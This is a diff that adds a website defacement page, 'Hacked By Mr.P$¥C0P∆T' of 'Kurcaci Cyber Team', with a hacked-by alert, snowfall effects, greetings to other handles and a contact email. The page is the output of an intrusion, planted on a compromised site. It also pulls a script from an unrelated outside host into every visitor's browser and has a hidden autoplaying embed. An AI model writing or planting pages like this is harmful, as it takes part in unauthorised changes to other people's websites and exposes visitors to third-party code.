@@ -1,0 +1,111 @@
+<html>
+ <head>
+ <link rel="shortcut icon" href="https://www.123rf.com/photo_92426792_an-anonymous-hacker-without-a-face-uses-a-mobile-phone-to-hack-the-system-stealing-personal-data-and.html" />
+ 
+ <meta property="og:image" 
+content="https://www.123rf.com/photo_92426792_an-anonymous-hacker-without-a-face-uses-a-mobile-phone-to-hack-the-system-stealing-personal-data-and.html" />
+ 
+  <meta property="og:title" content="Hacked By Mr.P$¥C0P∆T"/> <meta property="og:description" content="Kurcaci Cyber Team"/> <title>[+] Got Hacked [+]</title> <link href='http://fonts.googleapis.com/css?family=Jolly+Lodger' rel='stylesheet' type='text/css'> <link href='http://fonts.googleapis.com/css?family=Quicksand' rel='stylesheet' type='text/css'> <script src="http://e-mete.com/js/kdsnow.js"></script> <style> body{ background-image: url(https://i.gifer.com/3wbH.gif); background-repeat: no-repeat; background-attachment: fixed; background-position: top; background-color:#000000; position: relative; background-size:100% 100vh; } .logo { width: 300px; height: 300px; margin: 0 auto; margin-top: 50px; -webkit-filter: drop-shadow(0px 0px 7px #0080FF); filter: drop-shadow(0px 0px 7px #0080FF); } .logo:hover{ width: 300px; height: 300px; -webkit-filter: drop-shadow(0px 0px 10px #0080FF); opacity:0.4; filter:alpha(opacity=40); transition: opacity .2s ease-out; -moz-transition: opacity .2s ease-out; -webkit-transition: opacity .2s ease-out; -o-transition: opacity .2s ease-out; } .defacedby{ font-family: Megrim; text-align: center; color: black; font-weight: bold; font-size: 50px; text-shadow: #0080FF 1px 2px 1px; } .glow { font-family: Quicksand; text-align: center; color: grey; font-style: bold; font-size: 15px; margin-top: 16px; text-shadow: black 1px 2px 1px; } .greetings{ font-family: Quicksand; text-align: center; color: #ffffff; font-size: 15px; margin-top: 50px; text-shadow: black 1px 2px 1px; } </style> 
+ </head>
+ 
+ <SCRIPT> 
+var clickw=270;
+var clickh=50;
+var clickb=2;
+var clickc="black";
+var clickbg="black"; // Background color
+var clickt="=[[ <blink></blink>  ]]="; // Text to display
+var clickFont="font-family:Tahoma,arial,helvetica; font-size:10pt; font-weight:bold; color:red"; // The font style of the text
+new initReveal(0,'black','black',1,1,'lime','lime',3,10,true);
+</SCRIPT>
+
+ <script>
+var snowmax=35
+var snowcolor=new Array("#aaaacc","#ddddFF","#ccccDD")
+var snowtype=new Array("Arial Black","Arial Narrow","Times","Comic Sans MS")
+var snowletter="*"
+var sinkspeed=0.6
+var snowmaxsize=22
+var snowminsize=8
+var snowingzone=3
+var snow=new Array()
+var marginbottom
+var marginright
+var timer
+var i_snow=0
+var x_mv=new Array();
+var crds=new Array();
+var lftrght=new Array();
+var browserinfos=navigator.userAgent 
+var ie5=document.all&&document.getElementById&&!browserinfos.match(/Opera/)
+var ns6=document.getElementById&&!document.all
+var opera=browserinfos.match(/Opera/)  
+var browserok=ie5||ns6||opera
+
+function randommaker(range) {        
+    rand=Math.floor(range*Math.random())
+    return rand
+}
+
+function initsnow() {
+    if (ie5 || opera) {
+        marginbottom = document.body.clientHeight
+        marginright = document.body.clientWidth
+    }
+    else if (ns6) {
+        marginbottom = window.innerHeight
+        marginright = window.innerWidth
+    }
+    var snowsizerange=snowmaxsize-snowminsize
+    for (i=0;i<=snowmax;i++) {
+        crds[i] = 0;                      
+        lftrght[i] = Math.random()*15;         
+        x_mv[i] = 0.03 + Math.random()/10;
+        snow[i]=document.getElementById("s"+i)
+        snow[i].style.fontFamily=snowtype[randommaker(snowtype.length)]
+        snow[i].size=randommaker(snowsizerange)+snowminsize
+        snow[i].style.fontSize=snow[i].size
+        snow[i].style.color=snowcolor[randommaker(snowcolor.length)]
+        snow[i].sink=sinkspeed*snow[i].size/5
+        if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+        if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+        if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+        if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+        snow[i].posy=randommaker(2*marginbottom-marginbottom-2*snow[i].size)
+        snow[i].style.left=snow[i].posx
+        snow[i].style.top=snow[i].posy
+    }
+    movesnow()
+}
+
+function movesnow() {
+    for (i=0;i<=snowmax;i++) {
+        crds[i] += x_mv[i];
+        snow[i].posy+=snow[i].sink
+        snow[i].style.left=snow[i].posx+lftrght[i]*Math.sin(crds[i]);
+        snow[i].style.top=snow[i].posy
+        
+        if (snow[i].posy>=marginbottom-2*snow[i].size || parseInt(snow[i].style.left)>(marginright-3*lftrght[i])){
+            if (snowingzone==1) {snow[i].posx=randommaker(marginright-snow[i].size)}
+            if (snowingzone==2) {snow[i].posx=randommaker(marginright/2-snow[i].size)}
+            if (snowingzone==3) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/4}
+            if (snowingzone==4) {snow[i].posx=randommaker(marginright/2-snow[i].size)+marginright/2}
+            snow[i].posy=0
+        }
+    }
+    var timer=setTimeout("movesnow()",50)
+}
+
+for (i=0;i<=snowmax;i++) {
+    document.write("<span id='s"+i+"' style='position:absolute;top:-"+snowmaxsize+"'>"+snowletter+"</span>")
+}
+if (browserok) {
+    window.onload=initsnow
+}
+</script>
+  <body> <script> alert('Hacked By Mr.P$¥C0P∆T') </script> <center> <img src="http://www.sssp1.org/file/ikari404.png" class="logo"></img><br> </center> </div> <div class="glow"> <h2> <b><font color=red>Hacked By<font color=red> Mr.PSYC0P4T<b></h2> <font color="aqua"> 
+ 
+<br> <font color="red">INDONESIA<font color="white"> CYBER<br>
+<font color="cyan"Face"Jolly Lodger"><b>Para dewa yang dipuja didunia hacker, yaitu mereka yang telah menulis program besar yang berkemampuan tinggi dan dibutuhkandimana-mana, lalu memberikan program itu secara cuma-cuma dan sekarang program itu telah dipakai setiap orang.
+</br>
+ </div> <div class="greetings"> <b><font color=green>Kurcaci Cyber Team :<font color=white><br>.Mr.PSYC0P4T • Mr.Ar • 1rf4nCyb3r • aep • anna • dr@kCyber • Z3X •  • ⁨Tn.Takurr24 @⁨HaHaIn•M4R5H4L⁩•<br><font color=red>My Friend :<font color=white><br>MR.A_404 • ./V3T3R4nR4s1z • P3NJ4G4G3R3J4 • Bl4ck5h4d0w • Shinigami<br><br><font color="cyan">Contact Me : Mr.psycopat01@gmail.com</footer> </div> <embed src="https://www.yutube.com/v/v=loCEj0Rj5NY&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="1" height="1"></embed> </body> </html>
